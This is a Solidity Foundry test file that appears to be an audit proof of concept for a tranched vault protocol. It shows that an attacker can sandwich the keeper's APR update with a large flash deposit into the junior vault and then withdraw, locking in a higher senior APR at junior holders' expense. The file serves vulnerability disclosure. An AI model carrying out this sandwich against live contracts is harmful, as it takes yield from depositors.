// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import { console2 } from "forge-std/console2.sol";
import { IERC20 } from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import { IERC4626 } from "@openzeppelin/contracts/interfaces/IERC4626.sol";
import { StrataProtocolDeploymentBase } from "./StrataProtocolDeploymentBase.sol";

contract AccountingOnAprChangedSandwichTest is StrataProtocolDeploymentBase {
    string constant RESET = "\x1b[0m";
    string constant CYAN = "\x1b[36m";
    string constant GREEN = "\x1b[32m";
    string constant YELLOW = "\x1b[33m";
    string constant MAGENTA = "\x1b[35m";
    string constant RED = "\x1b[31m";

    uint256 constant WAD = 1e18;
    int64 constant APR_TARGET_WARMUP = 80_000_000_000; // 8%
    int64 constant APR_BASE_WARMUP = 110_000_000_000;  // 11%
    int64 constant APR_TARGET_UPDATE = 90_000_000_000; // 9%
    int64 constant APR_BASE_UPDATE = 125_000_000_000;  // 12.5%
    uint256 constant BASELINE_DEPOSIT = 2_000_000e18;
    uint256 constant FLASH_AMOUNT = 200_000_000e18;
    uint256 constant STRATEGY_GAIN = 10_000_000e18;
    uint256 constant SMALL_WITHDRAW = 1e18;

    address internal keeper;
    address internal seniorHolder;
    address internal juniorHolder;
    address internal attacker;
    address internal randomUser;

    struct RoundOutcome {
        uint256 aprBefore;
        uint256 aprAfterKeeper;
        uint256 aprAfterExit;
        uint256 seniorGain;
        uint256 juniorGain;
        uint256 srtNavPost;
        uint256 jrtNavPost;
        uint256 srtSharesForSmallWithdraw;
        uint256 jrtSharesForSmallWithdraw;
    }

    function pocOnAprChangedCanBeSandwiched() public {
        _initActors();
        _deployStrataStack();

        vm.startPrank(owner);
        acm.grantRole(UPDATER_FEED_ROLE, keeper);
        vm.stopPrank();

        _seedBaselineLiquidity();
        _primeFeed();

        uint256 snapshot = vm.snapshot();
        RoundOutcome memory honest = _playKeeperRound(false);
        vm.revertTo(snapshot);
        RoundOutcome memory attack = _playKeeperRound(true);

        console2.log(string.concat(CYAN, "===== Honest Keeper Round =====", RESET));
        _logOutcome(honest, CYAN);
        console2.log(string.concat(MAGENTA, "===== Manipulated Keeper Round =====", RESET));
        _logOutcome(attack, MAGENTA);

        require(attack.aprAfterKeeper > honest.aprAfterKeeper, "APR should lift for seniors");
        require(attack.aprAfterExit == attack.aprAfterKeeper, "APR must stay sticky");
        require(attack.seniorGain > honest.seniorGain, "Senior gain should increase");
        require(attack.juniorGain < honest.juniorGain, "Junior gain should drop");
        require(
            attack.srtSharesForSmallWithdraw < honest.srtSharesForSmallWithdraw,
            "Senior needs fewer shares for same assets"
        );
        require(
            attack.jrtSharesForSmallWithdraw > honest.jrtSharesForSmallWithdraw,
            "Junior pays more shares for same assets"
        );
    }

    function _playKeeperRound(bool withAttack) internal returns (RoundOutcome memory outcome) {
        outcome.aprBefore = accounting.aprSrt().unwrap();

        uint256 seniorShares = srtVault.balanceOf(seniorHolder);
        uint256 juniorShares = jrtVault.balanceOf(juniorHolder);
        uint256 seniorValueBefore = srtVault.convertToAssets(seniorShares);
        uint256 juniorValueBefore = jrtVault.convertToAssets(juniorShares);

        uint256 flashAssets;
        if (withAttack) {
            flashAssets = _frontRunDeposit();
        }

        console2.log(string.concat(GREEN, "[Keeper] pushing new feed pair", RESET));
        vm.prank(keeper);
        feed.updateRoundData(APR_TARGET_UPDATE, APR_BASE_UPDATE, uint64(block.timestamp));

        console2.log(string.concat(GREEN, "[Keeper] syncing accounting", RESET));
        vm.prank(keeper);
        accounting.onAprChanged();
        outcome.aprAfterKeeper = accounting.aprSrt().unwrap();
        console2.log(string.concat(GREEN, "[Keeper] aprSrt now", RESET), outcome.aprAfterKeeper);

        if (withAttack) {
            _backRunExit(flashAssets);
        }

        outcome.aprAfterExit = accounting.aprSrt().unwrap();

        vm.warp(block.timestamp + 30 days);
        _injectStrategyGain(STRATEGY_GAIN);
        console2.log(string.concat(GREEN, "[Post] settle accrual", RESET));
        // Simulate cdo.updateAccounting
        _dustDeposit(1e17);
        console2.log(string.concat(GREEN, "[Post] aprSrt reset for next period", RESET), accounting.aprSrt().unwrap());

        uint256 seniorValueAfter = srtVault.convertToAssets(seniorShares);
        uint256 juniorValueAfter = jrtVault.convertToAssets(juniorShares);

        outcome.seniorGain = seniorValueAfter - seniorValueBefore;
        outcome.juniorGain = juniorValueAfter - juniorValueBefore;
        outcome.srtNavPost = accounting.srtNav();
        outcome.jrtNavPost = accounting.jrtNav();
        outcome.srtSharesForSmallWithdraw = _sharesBurnedForWithdraw(
            IERC4626(address(srtVault)), seniorHolder, SMALL_WITHDRAW
        );
        outcome.jrtSharesForSmallWithdraw = _sharesBurnedForWithdraw(
            IERC4626(address(jrtVault)), juniorHolder, SMALL_WITHDRAW
        );
    }

    function _initActors() internal {
        keeper = makeAddr("keeper");
        seniorHolder = makeAddr("seniorHolder");
        juniorHolder = makeAddr("juniorHolder");
        attacker = makeAddr("searcher");
        randomUser = makeAddr("randomUser");
    }

    function _seedBaselineLiquidity() internal {
        deal(USDE, juniorHolder, BASELINE_DEPOSIT);
        vm.startPrank(juniorHolder);
        IERC20(USDE).approve(address(jrtVault), type(uint256).max);
        uint256 jrShares = jrtVault.deposit(BASELINE_DEPOSIT, juniorHolder);
        vm.stopPrank();
        console2.log(string.concat(YELLOW, "[Setup] junior seeded", RESET), BASELINE_DEPOSIT, "shares", jrShares);

        deal(USDE, seniorHolder, BASELINE_DEPOSIT);
        vm.startPrank(seniorHolder);
        IERC20(USDE).approve(address(srtVault), type(uint256).max);
        uint256 srShares = srtVault.deposit(BASELINE_DEPOSIT, seniorHolder);
        vm.stopPrank();
        console2.log(string.concat(YELLOW, "[Setup] senior seeded", RESET), BASELINE_DEPOSIT, "shares", srShares);
    }

    function _primeFeed() internal {
        vm.startPrank(owner);
        feed.setRoundStaleAfter(365 days);
        feed.updateRoundData(APR_TARGET_WARMUP, APR_BASE_WARMUP, uint64(block.timestamp - 1));
        accounting.onAprChanged();
        vm.stopPrank();
        console2.log(string.concat(CYAN, "[Setup] warm-up APR", RESET), accounting.aprSrt().unwrap());
    }

    function _frontRunDeposit() internal returns (uint256 flashAssets) {
        deal(USDE, attacker, FLASH_AMOUNT);
        vm.startPrank(attacker);
        IERC20(USDE).approve(address(jrtVault), type(uint256).max);
        console2.log(string.concat(MAGENTA, "[Searcher] nav before flash (jrt)", RESET), accounting.jrtNav());
        console2.log(string.concat(MAGENTA, "[Searcher] nav before flash (srt)", RESET), accounting.srtNav());
        console2.log(string.concat(MAGENTA, "[Searcher] flash deposit into junior", RESET), FLASH_AMOUNT);
        uint256 mintedShares = jrtVault.deposit(FLASH_AMOUNT, attacker);
        console2.log(string.concat(MAGENTA, "[Searcher] shares minted", RESET), mintedShares);
        console2.log(string.concat(MAGENTA, "[Searcher] nav after flash (jrt)", RESET), accounting.jrtNav());
        console2.log(string.concat(MAGENTA, "[Searcher] nav after flash (srt)", RESET), accounting.srtNav());
        console2.log(string.concat(MAGENTA, "[Searcher] apr snapshot", RESET), accounting.aprSrt().unwrap());
        vm.stopPrank();
        return FLASH_AMOUNT;
    }

    function _backRunExit(uint256 assetsDeposited) internal {
        vm.startPrank(attacker);
        console2.log(string.concat(MAGENTA, "[Searcher] exiting flash position", RESET), assetsDeposited, "assets");
        uint256 remainingAssets = assetsDeposited;
        while (remainingAssets > 0) {
            uint256 assetLimit = jrtVault.maxWithdraw(attacker);
            if (assetLimit == 0) {
                console2.log(string.concat(YELLOW, "    limiter hit", RESET), remainingAssets);
                break;
            }
            uint256 chunkAssets = remainingAssets > assetLimit ? assetLimit : remainingAssets;
            uint256 burnedShares = jrtVault.withdraw(chunkAssets, attacker, attacker);
            remainingAssets -= chunkAssets;
            console2.log(string.concat(YELLOW, "    withdrew chunk", RESET), chunkAssets, "burned", burnedShares);
            console2.log(string.concat(YELLOW, "    apr still locked", RESET), accounting.aprSrt().unwrap());
        }
        vm.stopPrank();
        console2.log(string.concat(MAGENTA, "[Searcher] nav after unwind (jrt)", RESET), accounting.jrtNav());
        console2.log(string.concat(MAGENTA, "[Searcher] nav after unwind (srt)", RESET), accounting.srtNav());
        console2.log(string.concat(RED, "[Searcher] apr persists after exit", RESET), accounting.aprSrt().unwrap());
    }

    function _injectStrategyGain(uint256 gainAssets) internal {
        IERC4626 susde = strategy.sUSDe();
        uint256 shares = susde.balanceOf(address(strategy));
        uint256 assetsBefore = susde.convertToAssets(shares);
        uint256 assetsAfter = assetsBefore + gainAssets;
        uint256 sharesTarget = susde.convertToShares(assetsAfter);
        console2.log(string.concat(CYAN, "[Yield] inject gain", RESET), gainAssets);
        deal(address(susde), address(strategy), sharesTarget);
    }

    function _logOutcome(RoundOutcome memory outcome, string memory color) internal view {
        console2.log(string.concat(color, "  apr before", RESET), outcome.aprBefore);
        console2.log(string.concat(color, "  apr after keeper", RESET), outcome.aprAfterKeeper);
        console2.log(string.concat(color, "  apr after exit", RESET), outcome.aprAfterExit);
        console2.log(string.concat(color, "  senior gain", RESET), outcome.seniorGain);
        console2.log(string.concat(color, "  junior gain", RESET), outcome.juniorGain);
        console2.log(string.concat(color, "  srt nav", RESET), outcome.srtNavPost);
        console2.log(string.concat(color, "  jrt nav", RESET), outcome.jrtNavPost);
        console2.log(
            string.concat(color, "  senior shares -> 1 asset", RESET), outcome.srtSharesForSmallWithdraw
        );
        console2.log(
            string.concat(color, "  junior shares -> 1 asset", RESET), outcome.jrtSharesForSmallWithdraw
        );
    }

    function _dustDeposit(uint256 amount) internal {
        deal(USDE, randomUser, amount);
        vm.startPrank(randomUser);
        IERC20(USDE).approve(address(jrtVault), type(uint256).max);
        jrtVault.deposit(amount, randomUser);
        vm.stopPrank();
    }

    function _sharesBurnedForWithdraw(IERC4626 vault, address holder, uint256 assets)
        internal
        returns (uint256 sharesBurned)
    {
        uint256 snapshotId = vm.snapshot();
        vm.startPrank(holder);
        sharesBurned = vault.withdraw(assets, holder, holder);
        vm.stopPrank();
        vm.revertTo(snapshotId);
    }
}
